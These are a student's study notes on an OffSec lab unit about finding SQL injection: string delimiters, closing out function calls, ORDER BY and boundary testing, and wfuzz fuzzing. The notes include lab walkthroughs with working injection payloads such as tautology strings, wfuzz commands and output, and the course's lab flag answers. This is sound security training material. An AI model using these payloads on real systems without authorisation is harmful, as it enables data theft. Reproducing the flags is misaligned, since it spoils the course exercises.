This Learning Unit covers the following Learning Objectives:

1. Understand how to test web applications to identify SQL injection vulnerabilities
2. Understand the basics of where injections points may occur in SQL queries
3. How to use fuzzing tools to identify SQL injection vulnerabilities

The most common method we can use to discover SQL injection is by identifying input fields that might be used in a database, then submitting characters in those fields that will break SQL queries. Some applications may be configured to return verbose error messages when an SQL error occurs. It's helpful for us to receive verbose error messages as the result of our attacks, since we can leverage these messages to identify SQL injection vulnerabilities. Other applications will not return errors, meaning we'll need to inspect any differences in responses instead.

Let's review several techniques for discovering SQL injection, starting with string delimiters.

-----------
#### 8.2.1. String Delimiters

One common way we can induce errors is to submit a single quote (') character as a string delimiter in SQL. If the value we submit isn't handled properly by the application, it can cause errors in SQL statements.

Suppose we have a SQL statement that is selecting all columns from the "menu" table with the name "Tostadas". The following shows how we might write our query:

A SQL statement selecting Tostadas
```sql
SELECT * FROM menu WHERE name = 'Tostadas'
```

If we control the input in the WHERE clause, we could try submitting the value "Tostadas'" with the additional single quote at the end. If this value were concatenated into the SQL statement, it would create an "imbalance" of single quotes.

Injecting a single quote
```sql
SELECT * FROM menu WHERE name = 'Tostadas''
```

The statement now has three single quotes. The first marks the start of a string value. The second single quote ends the string value. Finally, the third marks the start of a new string. A SQL database expects a "closing" single quote and will throw an error when parsing this statement, whereas an application might handle such an error more gracefully without informing end users.

If we encounter an application that throws a SQL error when a quote is introduced, we may be able to inject more SQL constraints and exfiltrate data. However, we may also need to handle an extra quote character in the query. One typical way to manage this is by initiating, but not completing, a new quoted value using the existing quote in the query. We'll discuss closing out queries in more detail in the next section.

Browse to http://sql-sandbox/discovery/strings for the following exercises.

##### Labs
https://portal.offsec.com/courses/osa-web-200-43711/learning/week-5-sql-injection-47189/live-session-47190/live-session-471881

1. `OS{6503B065AFF5ACE1308B07D54769BF10}`
![[Pasted image 20240817002643.png]]
Testing with `tostadas` a query we learned from the course
![[Pasted image 20240816125221.png]]
Searching with no paramaters shows no results
![[Pasted image 20240817000818.png]]
`2 or 1=1--` shows no results
![[Pasted image 20240817001123.png]]
throwing in a `'`  in `2 or 1=1--'a` makes it error out and see which parameter we are affecting. Now we can see that an extra single quote makes it error
![[Pasted image 20240817001853.png]]
makes it error as well - got the strings from the `offsec` video
```sql
a' or 'a' = 'a'
```
![[Pasted image 20240817002230.png]]
Displays the flag, due to the `strings` as well as correct amount of `'` single quotes being inserted
```sql
a' or 'a' = 'a
```
![[Pasted image 20240817002537.png]]

2. `OS{476C93C0A2466BD36924F96146378C8E}`
![[Pasted image 20240817004213.png]]
Testing bad parameters with sql below - `POSTGRES` is very similar if not exact to `MYSQL`
```sql
a' or 'a' = 'a'
```
![[Pasted image 20240817003611.png]]
Take away the extra `'` for the flag
```sql
a' or 'a' = 'a
```
![[Pasted image 20240817004125.png]]

3. `OS{91F35A8367B5A95A9AD223491BC4801D}`
![[Pasted image 20240817005038.png]]
error with to identify where the vulnerable parameter is
```sql
a' or 'a' = 'a'
```
![[Pasted image 20240817004905.png]]
take away the extra `'` and get the flag
```sql
a' or 'a' = 'a
```
![[Pasted image 20240817004839.png]]
4. `OS{EB18CFA47DAF5C2A6487AC692B6FFCB9}`
![[Pasted image 20240817005642.png]]
error with to identify where the vulnerable parameter is
```sql
a' or 'a' = 'a'
```
![[Pasted image 20240817005216.png]]
take away the extra `'` and get the flag
```sql
a' or 'a' = 'a
```
![[Pasted image 20240817005451.png]]


-----------
#### 8.2.2 Closing Out Strings and Functions

Our previous example used a simple string comparison. In real-world situations, it can be more challenging for us to leverage string comparisons in SQL queries, as developers must plan for variations in user input. For example, if one user searches for "tacos" and another user searches for "Tacos", should they get the same search results? Only a simple string comparison would be performed because string comparisons using the equals sign are case-sensitive in SQL, so the users would not receive the same results.

Many SQL databases offer functions that perform various data manipulation operations. Two common functions we might encounter in string comparisons are _UPPER()_, which converts text to uppercase, and _LOWER()_, which converts text to lowercase. While the functions _are_ database software specific, most databases implement these functions. Developers use these functions to ensure that strings being compared are in the same type case, thus avoiding the "tacos" vs "Tacos" scenario we described.

For example, a query might be written as:

A SELECT statement using the LOWER() function for string comparisons
```sql
SELECT * FROM menu WHERE LOWER(name) = LOWER('input_here')
```
Assuming we could inject into such a statement, we would need to "close out" not only the string (with a single quote), but also the parenthesis of the function call. In other words, our payload might resemble the following:

An example payload escaping or closing out a function call
```sql
foo') or id=11
```
The payload in Listing 5 contains an issue, however. This payload would complete or close out the function call, but cause a syntax error when concatenated into the query.

Example payload injected into a query
```sql
SELECT * FROM menu WHERE LOWER(name) = LOWER('foo') or id=11')
```
The query in Listing 6 contains an extra single quote and parenthesis after our payload. We can avoid this error by ending our payload using a comment. Similar to comments in programming languages, most SQL databases support the inclusion of comments that are not executed by the query processor. In most databases, two dashes (--) are used to mark a single-line comment. MySQL requires a space after the second dash at the start of a comment. MySQL also supports the hash symbol (#) as the start of a comment.

If we updated our previous payload to include a comment, it might resemble the following.

An example payload escaping or closing out a function call ending with a comment
```sql
foo') or id=11-- 
```
When our payload is inserted into the SQL statement, the resulting query no longer throws a syntax error because the trailing single quote and right parenthesis are part of a comment that will not be executed.

Example payload with comment injected into a query
```sql
SELECT * FROM menu WHERE LOWER(name) = LOWER('foo') or id=11-- ')
```
Let's consider one other string comparison scenario. Suppose a query needs partial string matching. For example, users searching for 'taco' and 'tacos' should expect the same results, which can be accomplished using the _LIKE_ operator. This operator supports wildcard characters. An underscore (_) represents a single character. The percent sign (%) represents any number of characters, including none.

We could rewrite our previous query to use the LIKE operator, as shown below.

Example query using the LIKE operator in a string comparison
```sql
SELECT * FROM menu WHERE LOWER(name) LIKE LOWER('%input_here%')
```

If we can inject into this type of statement, we will need to "close out" the delimiters in the correct order. We can ignore the percent sign since it is a wildcard, but we would still need to "close out" the single quote and parenthesis in our payload before adding new functionality.

In fact, our previous payload in Listing 7 containing a comment marker should also work for the query in Listing 9.

Example payload injected into a query with wildcards
```sql
SELECT * FROM menu WHERE LOWER(name) LIKE LOWER('%foo') or id=11-- %')
```

The single quote and right parenthesis in our payload closes out the _LOWER_ function call. We do not have to include another wildcard character in our payload since they are not string delimiters. After closing out the _LOWER_ function call, our payload includes an OR clause and ends with commenting out the rest of the SQL query.

It is impossible to predict every way a SQL statement could be written, which means it's essential that we understand the concept of "closing out" strings and functions at the point of injection if we want to craft a working SQL injection payload.

Browse to `http://sql-sandbox/discovery/functions` for the following exercises.


##### Labs
1. `OS{6942EE0E8B2099BCDD9FB43395177CB5}`
![[Pasted image 20240819133730.png]]
Utilizing `'test` parameter to see where injection point is
![[Pasted image 20240819132032.png]]
this identifies that the query being utilized is below and the injection point is between the `''`
```sql
SELECT id, name, description, price FROM menu WHERE lower(name) = lower('')
```
First tested this query from the course content - utilized `%` to close out the delimeters in the query
```sql
foo') or 1=1 -- %')
```
All of these work - in mysql the `--` must have a space before them. essentially make everything `1=1` to spit out all content 
```sql
foo') or id=11 or 1=1 -- %')
foo') or 1=1 -- %')
foo') or 1=1 -- %
```
![[Pasted image 20240819133633.png]]
2. `OS{01ACF1894453697DDA76B61C19C9314D}`
![[Pasted image 20240819143218.png]]
Utilizing `'test` parameter to see where injection point is
![[Pasted image 20240819142603.png]]
this identifies that the query being utilized is below and the injection point is between the `''`
```sql
SELECT id, name, description, price FROM menu WHERE lower(name) = lower('')
```
First tested this query from the course content - utilized `%` to close out the delimeters in the query
```sql
foo') or 1=1 -- %')
```
All of these work - in mysql the `--` must have a space before them. essentially make everything `1=1` to spit out all content 
```sql
foo') or id=11 or 1=1 -- %')
foo') or 1=1 -- %')
foo') or 1=1 -- %
```

![[Pasted image 20240819143050.png]]

3. `OS{63D819C008D86996F8A20DEEC3E2E16C}`

finding injection point with a `'`
![[Pasted image 20240819165006.png]]
All of these work - in mysql the `--` must have a space before them. essentially make everything `1=1` to spit out all content 
```sql
foo') or id=11 or 1=1-- %')
foo') or 1=1-- %')
foo') or 1=1-- %
```
![[Pasted image 20240819165327.png]]

4. `OS{EC926D156AF96773EE3C2E6BA51FB9D3}`
![[Pasted image 20240819170215.png]]
MSSQL presented an error that doesn't explain the fields of the SQL
![[Pasted image 20240819165809.png]]
```sql
foo') or id=11 or 1=1-- %')
foo') or 1=1-- %')
foo') or 1=1-- %
```
![[Pasted image 20240819170143.png]]


-----------
#### 8.2.3 Sorting

![[Pasted image 20240819170701.png]]

Depending on the application, we might be able to inject into the column name or the order.

Instead of ordering by a column name, we can also specify a numeric value corresponding to one of the returned columns. For example, if we submitted the query `SELECT name, price FROM menu ORDER BY 2`, the database would sort the results based on the price column. If we specify an invalid column, the database could throw an error, hinting at the existence of a SQL injection vulnerability. We can also use this technique to enumerate the number of columns in a query, iterating the value until an error is thrown.
![[Pasted image 20240819171410.png]]

Browse to `http://sql-sandbox/discovery/sorting` for the following exercises.

##### Labs
1. `OS{AD3106F005E0D28213D22BB9F7454404}`
![[Pasted image 20240819172033.png]]
Playing with the fields in the browser, in order to get flags must change `POST` request in `BURP`
![[Pasted image 20240819171949.png]]
Adding `2` to `asc` spit out the flag and made the query error
![[Pasted image 20240819171852.png]]
seems putting any string with a number attached to the end spits out the flag
![[Pasted image 20240819172207.png]]
2. `OS{F76851588399E3785CF498A15182A284}`
![[Pasted image 20240819172550.png]]
Starting point, in order to get flag must use burp
![[Pasted image 20240819172247.png]]
Plugging a number into the `name` cariable doesn't seem to wrok but the `order` variable does
![[Pasted image 20240819172503.png]]
profit by adding `2` 
![[Pasted image 20240819172619.png]]

3. `OS{2EA78C45CC9F009D05435EFD4AE1CAE9}`
![[Pasted image 20240819172926.png]]
Starting point - need to use burp for flag
![[Pasted image 20240819172829.png]]
oracle worked the same way
![[Pasted image 20240819172744.png]]
4. `OS{CF02B09FE7DCA253AC052837E7AB3F47}`
![[Pasted image 20240819173043.png]]
Starting point - need to use burp for flag
![[Pasted image 20240819173117.png]]
profit by adding a `2` to the `order`
![[Pasted image 20240819173136.png]]


-----------
#### 8.2.4 Boundary Testing

_Boundary testing_[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/testing-for-sql-injection-31301/sorting-31040#fn-local_id_408-1) is a common software testing technique that we can also use to find SQL injection vulnerabilities. Essentially, when we encounter a parameter that appears to take a limited data set, we should submit values that fall outside that set to determine how the application responds.

In the previous section, we covered how submitting an invalid column number in the ORDER BY clause creates an error. This is a form of boundary testing. Boundary testing _isn't_ limited to how SQL handles unexpected values. If a web application is dynamically-generating SQL queries based on user input, we could submit an unexpected or "out of bounds" value, causing the application logic to work in unintended ways. In other words, logic errors in a web application can potentially influence how the application constructs SQL queries.

Let's try boundary testing in the SQL Console in our sandbox application at http://sql-sandbox/sqlconsole. We'll enter SELECT * FROM menu ORDER BY 4 desc; as our query, leave the Database value set to "MySQL", and click _Submit Query_.

SQL Console with the contents of the menu table sorted by the fourth column
![[Pasted image 20240819184531.png]]

Let's suppose we encountered an application allowing us to control the input used in the ORDER BY clause. Essentially, this means we could change the "4" to something else. Since the application displays four columns of data, we would want to submit a value larger than four. One approach we might take is to make several requests, incrementing the value each time until we receive an error or a non-standard response, such as no results being displayed.

Let's update our query to SELECT * FROM menu ORDER BY 5 desc; and click _Submit Query_.

SQL Console with an error message indicating an invalid column number
![[Pasted image 20240819184626.png]]

The application responded with an error message in this case, indicating the _menu_ table has four columns.

Even if the application did not respond with a verbose error, we could still infer this information after submitting an invalid column number based on the size or content of the response. This can be a useful technique for identifying potential SQL injection vulnerabilities and enumerating the number of columns selected in a query.

Browse to `http://sql-sandbox/discovery/boundaries` for the following exercises.

(Wikipedia, 2021), [https://en.wikipedia.org/wiki/Boundary-value_analysis](https://en.wikipedia.org/wiki/Boundary-value_analysis) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/testing-for-sql-injection-31301/boundary-testing-31041#fnref-local_id_408-1)


##### Labs
1. `OS{3F752DC21FE3D0031F54E68DE0A4E76A}`
![[Pasted image 20240819185503.png]]
Starting point - need to use burp `POST` request to get flag
![[Pasted image 20240819185407.png]]
Entered `3` in the `sort` variable and shows all 3 fields 
![[Pasted image 20240819185119.png]]
once entering `4` into the `sort` variable spits out flag because of the boundary
![[Pasted image 20240819185246.png]]

2. `OS{4B4C606683D6AA7607B7E5D0CD634D6A}`
![[Pasted image 20240819191635.png]]
Change `sort=0` to `sort4` it becomes out of boundaries, causes an SQL error - profit
![[Pasted image 20240819191523.png]]


3. `OS{E7DF2638B96E1AAC2473C46F88E2DA4A}`
![[Pasted image 20240819191743.png]]
Change `sort=0` to `sort4` it becomes out of boundaries, causes an SQL error - profit
![[Pasted image 20240819191835.png]]

4. `OS{EB931C49AD63A3E7F65AAF5247668AF9}`
![[Pasted image 20240819192209.png]]
Change `sort=0` to `sort4` it becomes out of boundaries, causes an SQL error - profit - all done in repeater
![[Pasted image 20240819191929.png]]


-----------
#### 8.2.5 Fuzzing

We can use fuzzing as an effective technique for identifying potential SQL injection vulnerabilities. We may not successfully exploit more than a basic query vulnerable to SQL injection, but we can nevertheless inspect how an application responds to fuzzing to identify endpoints that respond differently based on our payloads. We can then perform manual testing to validate any potential findings.

Let's try it out using _wfuzz_ against our SQL sandbox application. We need an example request from the application, so we'll start Burp Suite and open the embedded Chromium browser. Next, we can go to the SQL Sandbox application at `http://sql-sandbox` and click on _Introduction_.

![[Pasted image 20240819194202.png]]
We'll enter "5" in the _Menu Item ID_ field, leave the _Database_ field set to "MySQL", and then click _Submit Query_. We don't care about the response in browser; instead, let's check our HTTP history in Burp Suite. We will find a POST request to `/api/intro`.
![[Pasted image 20240819194409.png]]
Now that we have a baseline request in Burp Suite, we can copy the POST body for use with wfuzz. We'll set `-c` to enable output with colors and set our payload list with    `-z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt`, using one of wfuzz's wordlists tailored to SQL injection. Next, we'll specify our POST data with `-d` and update the value of the `id` parameter to `FUZZ` so wfuzz will place payloads in that parameter. Finally, we can set the target URL with `-u`.

```bash
┌──(root💀gobots)-[19Aug2024 17:17:56]-[/home/kali]                                                                                                        
└─# wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&id=FUZZ" -u http://sql-sandbox/api/intro                                                                                   
********************************************************                                                                                                                                                   
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                                   
********************************************************                                                                                                   
Target: http://sql-sandbox/api/intro                                                                                                                                                                       
Total requests: 125                                                                                                                                        
=====================================================================                                                                                                                                      
ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
=====================================================================                                                                                                                                      

000000032:   500        0 L      52 W       358 Ch      "' or 1=1--"                                                                                       
000000029:   500        0 L      54 W       358 Ch      "' or 0=0 #"                                                                                       
000000030:   500        0 L      54 W       362 Ch      "" or 0=0 #"                                                                                       
000000033:   500        0 L      52 W       362 Ch      "" or 1=1--"                                                                                       
000000001:   500        0 L      48 W       340 Ch      "'"                                                                                                
000000003:   500        0 L      48 W       339 Ch      "#"                                                                                                
000000028:   500        0 L      52 W       356 Ch      "or 0=0 --"                                                                                        
000000027:   500        0 L      54 W       364 Ch      "" or 0=0 --"                                                                                      
000000026:   500        0 L      54 W       360 Ch      "' or 0=0 --"                                                                                      
000000025:   200        0 L      62 W       495 Ch      "0 or 1=1"                 ################      **                                                
000000024:   500        0 L      50 W       356 Ch      "')%20or%20('x'='x"                                                                                
000000023:   500        0 L      50 W       362 Ch      ""%20or%20"x"="x"                                                                                  
000000022:   500        0 L      50 W       354 Ch      "'%20or%20'x'='x"                                                                                  
000000021:   200        0 L      1 W        2 Ch        "'%20or%20''='"            ################                                                        
000000020:   500        0 L      48 W       361 Ch      "<>"'%;)(&+"                                                                                       
000000019:   500        0 L      48 W       349 Ch      "admin'--"                                                                                         
000000018:   500        0 L      52 W       362 Ch      "'or%20select *"                                                                                   
000000017:   500        0 L      52 W       392 Ch      "\x27\x6F\x72 SELECT *"                                                                            
000000014:   500        0 L      50 W       366 Ch      "\x3D%20\x3B'"                                                                                     
000000016:   500        0 L      52 W       392 Ch      "\x27\x4F\x52 SELECT *"                                                                            
000000013:   500        0 L      48 W       350 Ch      "\x27"                                                                                             
000000012:   500        0 L      48 W       350 Ch      "\x23"                                                                                             
000000011:   500        0 L      50 W       346 Ch      "=%20--"                                                                                           
000000010:   500        0 L      49 W       342 Ch      "=%20;"                                                                                            
000000009:   500        0 L      50 W       344 Ch      "=%20'"                                                                                            
000000006:   500        0 L      50 W       346 Ch      "'%20--"                                                                                           
000000008:   500        0 L      49 W       342 Ch      "'%20;"                                                                                            
000000005:   500        0 L      48 W       340 Ch      "--"                                                                                               
000000002:   500        0 L      48 W       344 Ch      """       
000000040:   200        0 L      1 W        2 Ch        "" or 1=1 or ""=""                                                                                 
000000042:   500        0 L      50 W       362 Ch      "" or "a"="a"                                                                                      
000000039:   200        0 L      1 W        2 Ch        "' or 1=1 or ''='"                                                                                 
000000036:   500        0 L      50 W       354 Ch      "or 1=1--"                                                                                         
000000038:   500        0 L      52 W       356 Ch      "or%201=1 --"                                                                                      
000000049:   500        0 L      52 W       366 Ch      "hi') or ('a'='a"                                                                                  
000000051:   200        0 L      62 W       495 Ch      "'hi' or 'x'='x';"   
```
These results require some interpretation. One useful approach is to check the response code and response size. For example, a 200 response code with a 2 character response is likely an empty response. Alternatively, a 200 response with a size greater than 2 characters might be a valid payload. A 500 response with a size greater than 2 characters, for example, might contain a useful error message.

We'll need to send a few payloads using _Repeater_ to more closely inspect these responses. Let's start with `--';`, omitting the double quotes.

Using Repeater to test a payload
![[Pasted image 20240819195145.png]]
As we suspected, the response includes an error message. The application created an invalid SQL query after processing our payload. The error message also includes the SQL query. We _could_ use this error message to craft a better payload, but for now, let's check one of the payloads that generated a 200 response with a size greater than two. We'll try updating the _id_ field to`0 or 1=1`, replacing the spaces with plus signs to URL-encode the string, then clicking _Send_.

Using Repeater to exploit SQL injection
![[Pasted image 20240819195557.png]]

The server responded with multiple items. It seems this payload was able to exploit the SQL injection to return the entire contents of the database table. Based on the error message in Figure 5, we know the SQL statement we're injecting into is `SELECT id, name, description, price FROM menu WHERE id = `. The payload we tested in Figure 6 therefore completes the SQL statement to `SELECT id, name, description, price FROM menu WHERE id = 0 or 1=1`. The WHERE clause now contains two conditions with an OR operator, meaning any record that matches either condition will be returned. The database will process `1=1` as a true boolean value and return every row in the _menu_ table. We could use this payload as a building block to craft a more specialized payload.

Fuzzing will not always identify a payload exploiting SQL injection vulnerabilities, but it is a useful technique for testing and identifying endpoints that might be vulnerable.

Browse to `http://sql-sandbox/discovery/fuzzing` for the following exercises. After capturing the initial HTTP traffic with Burp Suite, use wfuzz to complete the following exercises.

##### Labs
1. `OS{83B90225DEAC76F96DA8E4700C2CC79D}`
![[Pasted image 20240819203534.png]]
Starting Point - hit submit - and open burp
![[Pasted image 20240819195917.png]]
send to repeater
![[Pasted image 20240819200012.png]]
use command the path utilized in the post request for the `url`, copy the variable field - inset `FUZZ` on the `name=` field
```sql
┌──(root💀gobots)-[20Aug2024 00:03:06]-[/home/kali]
└─# wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&name=FUZZ&sort=id&order=asc" -u http://sql-sandbox/discovery/api/fuzzing
```
after running the command i get tipped off to try `'` that gave a `200` response and more than `2` characters 
![[Pasted image 20240819200704.png]]
utilizing this, I threw it into the `burpsuite` field to identify the results - This displayed the correct `id` fields`
![[Pasted image 20240819201317.png]]
testing the `order` parameter to bait for `500` errors to make the `SQL` serverr error and spit out the flag
```sql
┌──(root💀gobots)-[20Aug2024 00:03:06]-[/home/kali]
└─# wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&name=test&sort=id&order=FUZZ" -u http://sql-sandbox/discovery/api/fuzzing
```
![[Pasted image 20240819203324.png]]
now we can see a parameter that possibly works, we can test it in repeater by placing `' or 1=1--` in the `order=` field
profit
![[Pasted image 20240819203431.png]]

2. `OS{7ABD7BBCAA402D0DA8E024545B66EA1A}`
![[Pasted image 20240819205820.png]]
Startpoint - entering `test` in name to get  a `Burpsuite` request
![[Pasted image 20240819203622.png]]
sending to repeater
![[Pasted image 20240819203730.png]]
pull the `variables:"db=postgres&name=test&sort=id&order=asc"`   and `url: http://sql-sandbox/discovery/api/fuzzing` begin fuzzing by replacing `order=asc` with `order=FUZZ`

```sql
┌──(root💀gobots)-[20Aug2024 00:03:06]-[/home/kali]
└─# wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=postgres&name=test&sort=id&order=FUZZ" -u http://sql-sandbox/discovery/api/fuzzing
```
The `FUZZ` shows some results that we cant try
![[Pasted image 20240819204427.png]]
trying `'` shows the actual `SQL` that is being utilized with the query
`SELECT id, name, description, price FROM menu WHERE lower(name) LIKE lower('%%test%%') ORDER BY id '`
![[Pasted image 20240819205253.png]]
throwing any word like `test` in the order field spits out the `FLAG`
![[Pasted image 20240819205510.png]]
however `admin'--` also works, which was a `500` error string that showed in the `FUZZ`
![[Pasted image 20240819205554.png]]
I also remembered the `%%test%%` being utilized in a section above, so tried `%foo') or id=11-- %')` which also worked
![[Pasted image 20240819205718.png]]

3. `OS{95E31FE55146075BFCA03885C04CE635}`
![[Pasted image 20240819210757.png]]
Starting point to get `POST` request in `BURP`
![[Pasted image 20240819210019.png]]
Send to repeater
![[Pasted image 20240819210048.png]]
throw `'` into the `order` field and `GG`, nah just kidding im gonna walk through the methodology still
![[Pasted image 20240819210143.png]]
take the variables `db=oracle&name=test&sort=id&order=asc` and the url `http://sql-sandbox/discovery/api/fuzzing` to use in `FUZZ` command

```sql
┌──(root💀gobots)-[20Aug2024 00:03:06]-[/home/kali]
└─# wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=oracle&name=test&sort=id&order=FUZZ" -u http://sql-sandbox/discovery/api/fuzzing
```
take some of the `500` errors and try them in repeater to see if they work - we already know `'` works
![[Pasted image 20240819210522.png]]
`admin'--` works
![[Pasted image 20240819210623.png]]
`\x3D%20\x27` also works
![[Pasted image 20240819210719.png]]
4. `OS{6165307AEBF8C697870758F72B08FCE8}`
![[Pasted image 20240819211441.png]]
Starting Point - hit `submit` and check out request in burpsuite repeater
![[Pasted image 20240819210909.png]]
take the `variables` and `URL` to throw into the `WFUZZ` to fuzz the `ORDER` variable `db=mssql&name=testing&sort=id&order=asc`
![[Pasted image 20240819210957.png]]
**Make sure to change `asc` to `FUZZ`**
```sql
┌──(root💀gobots)-[20Aug2024 00:03:06]-[/home/kali]
└─# wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mssql&name=testing&sort=id&order=FUZZ" -u http://sql-sandbox/discovery/api/fuzzing
```
we now have parameters to test in the repeater
![[Pasted image 20240819211234.png]]
`-` test - works to generate flag
![[Pasted image 20240819211309.png]]